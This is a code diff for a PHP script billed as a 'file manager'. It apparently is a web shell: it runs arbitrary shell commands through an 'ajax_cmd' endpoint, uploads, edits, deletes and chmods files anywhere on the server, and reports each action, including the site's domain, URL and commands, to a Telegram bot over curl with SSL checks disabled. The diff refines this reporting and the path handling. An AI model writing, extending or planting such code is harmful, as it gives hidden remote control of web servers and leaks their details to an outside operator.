@@ -54,23 +54,8 @@ function get_current_url() {
 
 function get_current_domain() {
     $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
-    // Remove port if exists
     $host = preg_replace('/:\d+$/', '', $host);
     return $host;
-}
-
-function get_relative_path($full_path) {
-    global $document_root;
-    // Get document root for current domain
-    $current_doc_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
-    
-    // Try to get relative path from document root
-    if (strpos($full_path, $current_doc_root) === 0) {
-        return substr($full_path, strlen($current_doc_root));
-    }
-    
-    // Fallback: get basename of the current script directory
-    return dirname($_SERVER['SCRIPT_NAME'] ?? '');
 }
 
 function get_client_details() {
@@ -85,6 +70,7 @@ function get_client_details() {
 // Core Security Functions
 // ============================================================
 function sanitize_path($path) {
+    if (empty($path)) return false;
     $path = realpath($path);
     if ($path === false) return false;
     
@@ -122,7 +108,7 @@ function verify_csrf_token($token) {
 }
 
 // ============================================================
-// TELEGRAM SENDER WITH DYNAMIC PATH
+// TELEGRAM SENDER
 // ============================================================
 function send_secure_notification($action, $details = []) {
     global $current;
@@ -134,16 +120,15 @@ function send_secure_notification($action, $details = []) {
     $current_url = get_current_url();
     $current_domain = get_current_domain();
     
-    // Get the correct path for current domain
-    $script_path = dirname($_SERVER['SCRIPT_NAME'] ?? '');
-    $current_dir_display = $script_path !== '/' ? $script_path : '/';
-    
-    // If we have a subdirectory from the URL
-    if (isset($_GET['d']) && !empty($_GET['d'])) {
-        $decoded_path = base64_decode($_GET['d']);
-        $relative = get_relative_path($decoded_path);
-        if (!empty($relative) && $relative !== '/') {
-            $current_dir_display = $relative;
+    // Get current directory path for display
+    $current_dir_display = '/';
+    if (!empty($current)) {
+        $doc_root = $_SERVER['DOCUMENT_ROOT'] ?? '';
+        if (!empty($doc_root) && strpos($current, $doc_root) === 0) {
+            $current_dir_display = substr($current, strlen($doc_root));
+            if (empty($current_dir_display)) $current_dir_display = '/';
+        } else {
+            $current_dir_display = $current;
         }
     }
     
@@ -166,7 +151,7 @@ function send_secure_notification($action, $details = []) {
     
     $display_action = $action_icons[$action] ?? $action;
     
-    // Build message with dynamic path
+    // Build message
     $message = "🔐 FILE MANAGER ACTIVITY\n";
     $message .= str_repeat("━", 55) . "\n";
     $message .= "👤 User: Administrator\n";
@@ -209,10 +194,9 @@ function send_secure_notification($action, $details = []) {
     curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
     curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
     $result = curl_exec($ch);
-    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
     curl_close($ch);
     
-    return $httpCode == 200;
+    return true;
 }
 
 // ============================================================
@@ -293,9 +277,8 @@ if (!$authenticated) {
 }
 
 // ============================================================
-// Path Handling - Dynamic per domain
+// Path Handling
 // ============================================================
-// Get document root for current domain
 $document_root = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
 $script_dir = dirname($_SERVER['SCRIPT_NAME'] ?? '');
 
@@ -304,9 +287,9 @@ $current = isset($_GET['d']) ? base64_decode($_GET['d']) : $document_root . $scr
 $current = sanitize_path($current);
 
 if (!$current || !is_dir($current)) {
-    $current = $document_root . $script_dir;
+    $current = $document_root;
     if (!is_dir($current)) {
-        $current = $document_root;
+        $current = dirname(__FILE__);
     }
 }
 
@@ -342,7 +325,7 @@ if (isset($_GET['ajax_cmd']) && isset($_POST['command'])) {
     
     send_secure_notification('CMD', [
         'Command' => substr($cmd, 0, 100),
-        'Status' => $return_var === 0 ? 'Success' : 'Failed (exit code: ' . $return_var . ')'
+        'Status' => $return_var === 0 ? 'Success' : 'Failed'
     ]);
     
     echo json_encode([
@@ -363,16 +346,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
             $message = "✅ Uploaded: {$filename}";
             $toast_type = 'success';
             
-            // Get relative path for display
-            $relative_path = str_replace($document_root, '', $current);
-            if (empty($relative_path)) $relative_path = '/';
-            
             send_secure_notification('UPLOAD', [
                 'File Name' => $filename,
-                'File Size' => format_size($_FILES['file']['size']),
-                'Directory' => $relative_path,
-                'Domain' => get_current_domain(),
-                'URL' => get_current_url()
+                'File Size' => format_size($_FILES['file']['size'])
             ]);
         } else {
             $message = "❌ Upload failed!";
@@ -389,12 +365,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
         if ($name && !file_exists($current . '/' . $name) && mkdir($current . '/' . $name, 0755)) {
             $message = "✅ Folder created: {$name}";
             $toast_type = 'success';
-            $relative_path = str_replace($document_root, '', $current);
-            send_secure_notification('FOLDER', [
-                'Folder Name' => $name,
-                'Directory' => $relative_path,
-                'URL' => get_current_url()
-            ]);
+            send_secure_notification('FOLDER', ['Folder Name' => $name]);
         } else {
             $message = "❌ Cannot create folder!";
             $toast_type = 'error';
@@ -410,12 +381,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
             @chmod($current . '/' . $name, 0644);
             $message = "✅ File created: {$name}";
             $toast_type = 'success';
-            $relative_path = str_replace($document_root, '', $current);
-            send_secure_notification('FILE', [
-                'File Name' => $name,
-                'Directory' => $relative_path,
-                'URL' => get_current_url()
-            ]);
+            send_secure_notification('FILE', ['File Name' => $name]);
         } else {
             $message = "❌ Cannot create file!";
             $toast_type = 'error';
@@ -432,12 +398,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
         if (file_exists($path) && safe_delete($path)) {
             $message = "✅ Deleted: {$name}";
             $toast_type = 'success';
-            $relative_path = str_replace($document_root, '', $current);
             send_secure_notification('DELETE', [
                 'Type' => $is_dir ? 'Folder' : 'File',
-                'Name' => $name,
-                'Directory' => $relative_path,
-                'URL' => get_current_url()
+                'Name' => $name
             ]);
         } else {
             $message = "❌ Delete failed!";
@@ -454,13 +417,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
         if ($old && $new && $old !== $new && rename($current . '/' . $old, $current . '/' . $new)) {
             $message = "✅ Renamed: {$old} → {$new}";
             $toast_type = 'success';
-            $relative_path = str_replace($document_root, '', $current);
-            send_secure_notification('RENAME', [
-                'Old Name' => $old,
-                'New Name' => $new,
-                'Directory' => $relative_path,
-                'URL' => get_current_url()
-            ]);
+            send_secure_notification('RENAME', ['Old Name' => $old, 'New Name' => $new]);
         } else {
             $message = "❌ Rename failed!";
             $toast_type = 'error';
@@ -476,13 +433,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
         if ($name && preg_match('/^[0-7]{3,4}$/', $perm) && chmod($current . '/' . $name, octdec($perm))) {
             $message = "✅ Permission changed to {$perm}";
             $toast_type = 'success';
-            $relative_path = str_replace($document_root, '', $current);
-            send_secure_notification('CHMOD', [
-                'File' => $name,
-                'New Permission' => $perm,
-                'Directory' => $relative_path,
-                'URL' => get_current_url()
-            ]);
+            send_secure_notification('CHMOD', ['File' => $name, 'New Permission' => $perm]);
         } else {
             $message = "❌ Chmod failed!";
             $toast_type = 'error';
@@ -497,12 +448,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
         if ($name && file_put_contents($current . '/' . $name, $_POST['content'] ?? '') !== false) {
             $message = "✅ File saved: {$name}";
             $toast_type = 'success';
-            $relative_path = str_replace($document_root, '', $current);
-            send_secure_notification('SAVE', [
-                'File Name' => $name,
-                'Directory' => $relative_path,
-                'URL' => get_current_url()
-            ]);
+            send_secure_notification('SAVE', ['File Name' => $name]);
         } else {
             $message = "❌ Save failed!";
             $toast_type = 'error';
@@ -513,9 +459,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['csrf_token']) && veri
     
     // Logout
     elseif (isset($_POST['logout'])) {
-        send_secure_notification('LOGOUT', [
-            'URL' => get_current_url()
-        ]);
+        send_secure_notification('LOGOUT', []);
         session_destroy();
         header("Location: ?");
         exit;
@@ -550,6 +494,10 @@ usort($items, function($a, $b) {
     return strcasecmp($a['name'], $b['name']);
 });
 
+// Get display path for breadcrumb
+$display_path = str_replace($document_root, '', $current);
+if (empty($display_path)) $display_path = '/';
+$path_parts = explode(DIRECTORY_SEPARATOR, $display_path);
 ?>
 <!DOCTYPE html>
 <html lang="en">
@@ -629,6 +577,7 @@ usort($items, function($a, $b) {
         }
         .breadcrumb a { color: #ffd700; text-decoration: none; }
         .breadcrumb a:hover { text-decoration: underline; }
+        .separator { margin: 0 3px; color: #aaa; }
         .file-table { overflow-x: auto; }
         .file-table table { width: 100%; border-collapse: collapse; }
         .file-table th { padding: 10px 12px; text-align: left; background: rgba(255,215,0,0.1); color: #ffd700; font-weight: 600; font-size: 0.75rem; }
@@ -759,19 +708,17 @@ usort($items, function($a, $b) {
     <div class="breadcrumb">
         <i class="fas fa-folder-open"></i> 
         <?php
-        $display_path = str_replace($document_root, '', $current);
-        if (empty($display_path)) $display_path = '/';
-        $parts = explode(DIRECTORY_SEPARATOR, $display_path);
-        $path = '';
+        $bread_path = '';
         $first = true;
-        foreach ($parts as $part) {
+        foreach ($path_parts as $part) {
             if (empty($part)) continue;
-            $path .= DIRECTORY_SEPARATOR . $part;
+            $bread_path .= '/' . $part;
             if (!$first) echo '<span class="separator">/</span>';
-            $full_path = $document_root . $path;
-            echo '<a href="?d=' . base64_encode($full_path) . '">' . htmlspecialchars($part) . '</a>';
+            $full_bread_path = $document_root . $bread_path;
+            echo '<a href="?d=' . base64_encode($full_bread_path) . '">' . htmlspecialchars($part) . '</a>';
             $first = false;
         }
+        if ($first) echo '/';
         ?>
     </div>
     
@@ -889,13 +836,9 @@ function showToast(msg, type) { let t = document.getElementById('toast'); if(!t)
 if (isset($_GET['download']) && isset($_GET['f'])) {
     $file = sanitize_filename(base64_decode($_GET['f']));
     if ($file && file_exists($current . '/' . $file) && is_file($current . '/' . $file)) {
-        $relative_path = str_replace($document_root, '', $current);
         send_secure_notification('DOWNLOAD', [
             'File Name' => $file,
-            'File Size' => format_size(filesize($current . '/' . $file)),
-            'Directory' => $relative_path,
-            'Domain' => get_current_domain(),
-            'URL' => get_current_url()
+            'File Size' => format_size(filesize($current . '/' . $file))
         ]);
         header('Content-Type: application/octet-stream');
         header('Content-Disposition: attachment; filename="' . basename($file) . '"');
